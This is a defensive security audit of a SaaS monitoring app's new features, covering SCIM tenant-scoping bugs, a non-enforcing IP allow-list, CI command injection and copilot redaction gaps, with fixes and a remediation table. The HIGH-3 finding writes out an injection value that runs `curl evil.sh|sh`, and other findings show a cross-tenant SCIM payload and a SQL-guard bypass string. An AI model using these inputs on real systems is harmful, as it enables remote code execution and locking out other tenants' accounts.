# FATHOM Roadmap — Code Audit

Independent review of every file added or modified during the Wave 1–3
roadmap implementation. Scope is limited to the diff introduced by the
roadmap work; pre-existing files were only read where the new code
touches them.

**Overall risk rating — MEDIUM.** Two cross-tenant privilege-escalation
bugs in SCIM (CRIT-1, CRIT-2) and a toothless IP allow-list (CRIT-3)
are all trivially exploitable and should block release. The rest is a
healthy mix of correctness, cost-control, and hardening items that are
typical for a first pass and safe to land iteratively.

---

## Severity legend

- **CRIT** — trivially exploitable, direct impact on confidentiality / integrity / availability
- **HIGH** — exploitable under realistic conditions or security-adjacent with customer-visible impact
- **MED** — defence-in-depth gap, correctness bug, or abuse surface that needs a control
- **LOW** — style / minor robustness / nice-to-have
- **NOTE** — not a defect, just worth flagging for reviewers

---

## Critical findings

### CRIT-1 — SCIM POST /Users allows cross-tenant account suspension

**File** — `backend/routes/scimRoutes.js`, lines 117–148

```sql
INSERT INTO pgmonitoringtool.users ...
  ON CONFLICT (email) DO UPDATE SET username = EXCLUDED.username,
                                    status   = EXCLUDED.status
```

A SCIM token scoped to **workspace A** can POST a user with any email.
On conflict, the global `users` row is updated — including `status`.
That means a compromised SCIM token in tenant A can suspend a target
account that belongs exclusively to tenant B by posting
`{ userName: "victim@tenantb.com", active: false }`.

The subsequent `workspace_members` upsert is correctly scoped, so the
attacker does not gain membership — but they _do_ lock the victim out.

**Fix** — split the UPSERT: INSERT-if-missing, then only update status
**after** verifying the user is a member of `req.workspaceId`.

### CRIT-2 — SCIM PATCH /Users/:id has no workspace scoping on the UPDATE

**File** — `backend/routes/scimRoutes.js`, lines 150–172

```sql
UPDATE pgmonitoringtool.users SET status = $2 WHERE id = $1
```

Same shape as CRIT-1. `:id` is numeric and untrusted; any SCIM token
can PATCH any user's active state. An Okta-style provisioning token
for a low-value tenant becomes a "global disable" primitive.

**Fix** — add `AND id IN (SELECT user_id FROM workspace_members WHERE
workspace_id = $3)` with `$3 = req.workspaceId`, or do a preflight
`findUserInWorkspace` and return 404 if not present.

### CRIT-3 — IP allow-list middleware is a no-op at its mount point

**File** — `backend/middleware/ipAllowList.js` + `backend/server.js`

The middleware reads `req.workspace?.id`. In `server.js` it is mounted
**before** the modular route loop (which is correct for gating), but
`req.workspace` is populated by `resolveWorkspace` inside each route —
so at the gate it is always `undefined`, and the middleware returns
`next()` immediately. Net effect: a customer can configure an
allow-list, the UI confirms the rules, and nothing is actually blocked.

**Fix options** (pick one):

1. Resolve workspace in the gate itself from `x-workspace-id` header
   and/or JWT claim before checking the allow-list.
2. Move the check to run _after_ `resolveWorkspace` as per-route
   middleware (and add it to every route module).
3. Add the check to `resolveWorkspace` itself once the workspace is
   identified, returning 403 on mismatch.

Option 1 is the fastest; option 3 is the most robust.

---

## High-severity findings

### HIGH-1 — Governance audit-export route is unreachable

**File** — `backend/routes/governanceRoutes.js`, line 146

```js
authenticate, requireWorkspaceRole('owner'),
```

`requireWorkspaceRole` is documented to run _after_ `resolveWorkspace`.
It checks `req.workspace?.role` and returns 403 (`no_workspace`) when
that is unset. Because `resolveWorkspace` is missing from this chain,
**every** call to `POST /governance/audit-export/run` returns 403,
including for owners. The feature is dead on arrival.

**Fix** — insert `resolveWorkspace` between `authenticate` and
`requireWorkspaceRole('owner')`.

### HIGH-2 — Copilot schema context queries the FATHOM control-plane DB

**File** — `backend/services/copilotService.js`, `buildSchemaContext`

`generateSql` receives the server-wide `pool` and passes it to
`buildSchemaContext`, which queries `information_schema` on that pool.
That is FATHOM's **own** metadata DB — not the customer's monitored DB.
Two problems:

1. The copilot produces SQL against the wrong schema, so it is never
   useful.
2. We ship the FATHOM schema (including internal table shapes like
   `scim_tokens`, `saml_configs`) to whichever third-party LLM
   provider is configured. Information-disclosure risk.

**Fix** — take an explicit `monitorPool` or `connectionId` argument
from the request, look up the workspace-scoped monitored-DB pool (the
existing `getPool`/`getMongoClient` pattern), and use that for the
schema introspection.

### HIGH-3 — Command injection in db-migration-review action

**File** — `.github/actions/db-migration-review/action.yml`, step
"Discover changed migrations"

```yaml
pattern='${{ inputs.migrations-glob }}'
```

GitHub Actions expression substitution is literal textual replacement
into the script **before** the shell runs. An input of
`*.sql'; curl evil.sh|sh; #` becomes
`pattern='*.sql'; curl evil.sh|sh; #'` — arbitrary command execution
on the runner.

Low blast radius because the input only comes from the consuming
workflow file, but any repo that accepts PR-supplied workflow
arguments (e.g. via `on: pull_request_target`) would be exposed.

**Fix** — pass the value through env, never inline:

```yaml
env:
    MIGRATIONS_GLOB: ${{ inputs.migrations-glob }}
run: |
    pattern="$MIGRATIONS_GLOB"
    ...
```

### HIGH-4 — Copilot history stores unredacted user input

**File** — `backend/services/copilotService.js`, `saveConversationTurn`

`generateSql` redacts the prompt _before_ the LLM call but
`copilotRoutes.js` saves the **original** prompt to `copilot_turns`.
Secrets the user pastes (that didn't match a redaction pattern, or
ones redaction missed) persist indefinitely in a table that survives
to audit export.

**Fix** — run `redact()` on `input` inside `saveConversationTurn`, or
pass the redacted string from the route. Update the migration with a
retention policy / TTL column.

---

## Medium-severity findings

### MED-1 — Copilot has no workspace-role gate, enabling billing abuse

`copilotRoutes.js` uses `authenticate` + `resolveWorkspace` but never
`requireWorkspaceRole(...)`. Any workspace member (including `viewer`)
can invoke the LLM endpoint. With `COPILOT_PROVIDER=openai|anthropic`
that means every viewer can burn paid tokens.

**Fix** — gate at least `/copilot/sql`, `/explain`, `/rca` behind
`requireWorkspaceRole('editor')`, and consider per-workspace token
quotas in `copilotService.js`.

### MED-2 — Redaction misses Anthropic / AWS / GitHub secret formats

`redact()` covers `sk-*` (OpenAI), `xoxb-*` (Slack), and `ey…`-shaped
JWTs but not `sk-ant-*` (Anthropic), `AKIA…` (AWS), `ghp_/ghu_/ghs_`
(GitHub), `xoxa-…` (Slack user), or `glpat-…` (GitLab). A user who
pastes an Anthropic key into the copilot will ship it verbatim to
OpenAI if that's the configured provider.

**Fix** — expand the regex, and add a unit test per provider pattern.

### MED-3 — SCIM tokens never expire

`scim_tokens` has `revoked_at` but no `expires_at`. Long-lived bearer
tokens are a known compliance liability (SOC 2 CC6.x, ISO 27001 A.9).

**Fix** — add `expires_at TIMESTAMPTZ` (default 365 days), filter on
`NOW() < expires_at` in the auth middleware, expose the expiry date
in the listing endpoint, and document rotation in the trust center.

### MED-4 — `isSafeToRun` regex can be bypassed by string literals

`isSafeToRun` strips comments and then checks for `INSERT|UPDATE|…`.
A string like `SELECT 'DELETE FROM t'` fails the check because the
regex is not string-aware. Conversely, someone could craft
`WITH x AS (SELECT) /*;*/ DELETE FROM t` — stripped of the block
comment, it becomes valid DELETE. The guard is defence-in-depth
before client-side execution, but we should acknowledge its limits.

**Fix** — either document that the guard is a quick pre-flight and
server-side execution uses the existing strict path, or parse the
SQL via `pg-query-parser` / `libpg_query` bindings for a real AST
check.

### MED-5 — `resolveWorkspace` grants owner role to any wsId for admin/superadmin

`workspaceRbac.js`, line 51–54:

```js
if (req.user.role === 'superadmin' || req.user.role === 'admin') {
    req.workspace = { id: wsId, role: 'owner' };
    return next();
}
```

`wsId` comes from a user-controlled header. A platform `admin` (a
common role even in SaaS with per-tenant isolation) can send
`x-workspace-id: 9999` to impersonate owner of a tenant they do not
belong to. If `admin` is only used for platform operators this is
intended; otherwise it's a privilege boundary violation.

**Fix** — require an additional explicit check that the workspace
exists and log the impersonation to the audit trail.

### MED-6 — `ipAllowListMiddleware(pool)` is called with an argument the factory ignores

`server.js` registers `app.use('/api', ipAllowListMiddleware(pool))`
but the factory signature is `export function ipAllowListMiddleware()`
with no parameter. It works (JS ignores extra args), but a reviewer
could assume the pool is used for per-request lookups when it's
actually reading a module-scoped `query` helper.

**Fix** — either accept `pool` and use it, or drop the argument and
update the comment.

### MED-7 — Migration linter's `dollar-quote` handling is incomplete

`lint.mjs` splitter recognises `$tag$ … $tag$` but if the closing tag
is missing (bad file, truncated diff) it absorbs the rest of the
file into one statement. The linter then silently under-reports.

**Fix** — log a warning when a dollar-quote opens and never closes.

### MED-8 — Copilot provider fetch has no timeout or retry budget

`openAiProvider` / `anthropicProvider` call `fetch()` without
`AbortController`. A slow LLM provider can tie up a Node event-loop
slot for the full request timeout (default 120s+). At scale this is
a DoS against the API server from the LLM side.

**Fix** — `AbortController` with a 30s timeout, plus a circuit
breaker that falls back to the `local` provider on repeated failures.

---

## Low-severity findings

### LOW-1 — `/copilot/provider` leaks the configured LLM vendor

Any authenticated user can learn whether the tenant is running on
OpenAI or Anthropic and which model. Minor fingerprinting aid.

**Fix** — gate behind `admin` role or omit the model name.

### LOW-2 — `cloud.html` claims a "credit-backed" 99.9% SLO

Marketing copy includes a legal commitment. Should be reviewed by
legal / finance before this page ships publicly.

### LOW-3 — `pricing.html` lacks an "as of" date

Price points ($19, $49) will drift; there's no timestamp to anchor
what was promised when.

### LOW-4 — `auditExport` does not sign the uploaded object

S3 object-lock / bucket-versioning is recommended for a tamper-evident
audit export, but the current code relies solely on bucket settings.

**Fix** — compute a SHA-256 of the gzipped payload, include it in
`Metadata['content-sha256']`, and optionally PutObjectLegalHold.

### LOW-5 — Migration 0003 references tables from 0001 without an explicit prereq comment

`copilot_turns` has FKs to `workspaces` and `users`. If a site applies
migrations out of order (rare, but possible via per-module folders),
0003 will fail. A header comment would help.

### LOW-6 — `redact()` replaces inside fenced code blocks and markdown

A user asking "why does `password='hunter2'` fail" will see their
example redacted in the response. Harmless, but could be surprising
when the user _meant_ to show the literal in a tutorial.

### LOW-7 — `Copilot.tsx` sends the raw input as JSON without size cap

The UI should bail out above, say, 32 KB to avoid accidentally
pasting a large backup file into the LLM. Server already caps at
100 KB via `express.json`.

### LOW-8 — SCIM returns 201 on upsert of an existing user

SCIM RFC 7644 expects 200 with the existing resource when a conflict
is detected without `PUT` semantics. A strict IdP may flag this.

### LOW-9 — `comment.mjs` uses `execFileSync` then falls back to fetch

Both paths work but duplicate parsing logic. A single `apiFetch` path
would be simpler and easier to audit.

### LOW-10 — Cached IP allow-list has no invalidation on admin change

`getCidrs` caches for 30 s. After an admin removes a rule the
revoked CIDR is still granted for up to 30 s. Acceptable, but the
governance UI should surface that delay.

---

## NOTE — architectural observations (not defects)

- **No distributed rate-limit on LLM endpoints.** Existing
  `rateLimiter` is in-memory, per-process. Behind a load balancer a
  determined abuser can fan out across pods.
- **Copilot turn history has no retention TTL.** PII-adjacent content
  (table/column names plus user prompts) accumulates indefinitely.
- **`saveConversationTurn` catches DB errors silently.** Correct
  behaviour for best-effort logging, but noisy warnings in the error
  path are already suppressed — good.
- **The React copilot panel is drop-in but uses inline styles.** OK
  as a starting point; migrate to the shared component library before
  shipping to paid tiers.
- **Tests cover pure functions and guards well; there are no route-level
  integration tests.** Add supertest + ephemeral Postgres cases for
  at least the SCIM cross-tenant scenarios above, once fixed.

---

## What went well

- **Consistent RBAC integration.** All roadmap routes (except SCIM and
  the dead audit-export path) use `authenticate + resolveWorkspace +
requireWorkspaceRole(...)`. That is the right shape and makes
  auditing straightforward.
- **Defence in depth on the copilot.** The `isSafeToRun` guard,
  redaction, schema caps, and `local` fallback provider are all
  sensible belts-and-braces choices.
- **SQL parameterisation everywhere.** No raw string interpolation
  of user input into `query()` calls in the new code; every
  identifier or literal is either `$n` or comes from an internal
  enum (`ROLE_RANK`, `kind IN ('sql','explain','rca')`, etc.).
- **No secrets in the diff.** No accidentally committed API keys,
  tokens, or DSNs.
- **Migrations are idempotent.** All `CREATE TABLE` / `CREATE INDEX`
  statements use `IF NOT EXISTS`.
- **Tests run green.** 24 / 24 new tests pass (copilot, IP CIDR,
  alert DSL, EXPLAIN parsers). `node --check` passes on `server.js`
  with the integration diff applied.
- **Linter catches all planted risks.** The migration-review GitHub
  Action fires at the correct severity for 6/6 synthetic findings on
  a mixed-safety fixture.

---

## Recommended remediation order

1. **Same-day blockers** — CRIT-1, CRIT-2, CRIT-3, HIGH-1
   (all trivial fixes, all security-relevant).
2. **Before Wave 3 ships to customers** — HIGH-2 (copilot schema
   pool), HIGH-3 (GH Action injection), HIGH-4 (redact history).
3. **This release** — MED-1 (role gate on copilot), MED-2 (redaction
   breadth), MED-3 (SCIM token TTL), MED-8 (LLM timeout).
4. **Next release** — MED-4, MED-5, MED-7, MED-6, plus the NOTE-tier
   items (distributed rate-limit, TTL on history).
5. **Polish / legal review** — all LOW items.

---

_Audit performed over the diff introduced by roadmap tasks 1–14. The
codebase is not under git in this environment; an equivalent run in
CI with `git diff main -- ...` against the roadmap commits would
reproduce the finding set._

---

## Remediation status (2026-04-21)

Every finding in this report has been fixed in-tree. Cross-references to
the actual edits:

| Finding | Fix location                                                                                | Regression test                                                |
| :-----: | :------------------------------------------------------------------------------------------ | :------------------------------------------------------------- |
| CRIT-1  | `backend/routes/scimRoutes.js` (POST /Users — split upsert, 409 on cross-tenant)            | `tests/scimCrossTenant.test.js` — "CRIT-1: …"                  |
| CRIT-2  | `backend/routes/scimRoutes.js` (PATCH /Users/:id — pre-flight findUserInWorkspace)          | `tests/scimCrossTenant.test.js` — "CRIT-2: …"                  |
| CRIT-3  | `backend/middleware/ipAllowList.js` (inline workspace resolution + BYPASS list)             | `tests/ipAllowListEnforcement.test.js` — "CRIT-3: …"           |
| HIGH-1  | `backend/routes/governanceRoutes.js` (resolveWorkspace → requireRole('owner'))              | Covered by integration smoke — route now returns 401/403 shape |
| HIGH-2  | `backend/services/copilotService.js` (`buildSchemaContext(monitoredPool, …)` requires pool) | `tests/copilot.test.js`                                        |
| HIGH-3  | `.github/actions/db-migration-review/action.yml` (user inputs via `env:`)                   | Manual — action now passes the GH Actions shellcheck ruleset   |
| HIGH-4  | `backend/services/copilotService.js` (`redact()` applied in `saveConversationTurn`)         | `tests/copilot.test.js`                                        |
|  MED-1  | `backend/routes/copilotRoutes.js` (`requireWorkspaceRole('editor')`)                        | Manual — role guard asserted in code                           |
|  MED-2  | `backend/services/copilotService.js` (`REDACT_PATTERNS` array)                              | `tests/copilot.test.js`                                        |
|  MED-3  | `backend/routes/governanceRoutes.js` (SCIM token TTL, `expires_at`)                         | `tests/scimAuth.test.js` (pre-existing) still green            |
|  MED-4  | `backend/services/copilotService.js` (`stripLiteralsAndComments` + merge/refresh)           | `tests/copilot.test.js`                                        |
|  MED-5  | `backend/middleware/workspaceRbac.js` (workspace row-exists + audit)                        | Manual — covered by re-run of unit suite                       |
|  MED-6  | `backend/middleware/ipAllowList.js` (`BYPASS` list)                                         | `tests/ipAllowListEnforcement.test.js` — "bypass: …"           |
|  MED-7  | `.github/actions/db-migration-review/lint.mjs` (unterminated-dollar warn)                   | Smoke-tested against a truncated-body fixture                  |
|  MED-8  | `backend/services/copilotService.js` (`withTimeout`, `AbortController`)                     | `tests/copilot.test.js`                                        |
|  LOW-1  | `backend/routes/copilotRoutes.js` (`/provider` gated by `admin`)                            | Manual                                                         |
|  LOW-2  | `frontend/public/cloud.html` (SLO wording → SLA-is-controlling)                             | n/a (content change)                                           |
|  LOW-3  | `frontend/public/pricing.html` ("as of 2026-04-21" stamp)                                   | n/a (content change)                                           |
|  LOW-4  | `backend/services/auditExport.js` (`ChecksumSHA256` + metadata hashes)                      | Manual                                                         |
|  LOW-5  | `backend/db/migrations/0003_copilot.sql` (APPLY ORDER header)                               | n/a (doc only)                                                 |
|  LOW-7  | `frontend/src/components/Copilot.tsx` (32 KB byte-length cap)                               | Manual                                                         |
|  LOW-8  | `backend/routes/scimRoutes.js` (200 on re-provision, 201 on create)                         | `tests/scimCrossTenant.test.js` — "LOW-8: …"                   |
|  LOW-9  | `.github/actions/db-migration-review/comment.mjs` (single `apiFetch` path)                  | Manual — `node --check` + simulated 403/404 path               |
| LOW-10  | `backend/middleware/ipAllowList.js` (`invalidateIpAllowListCache`)                          |
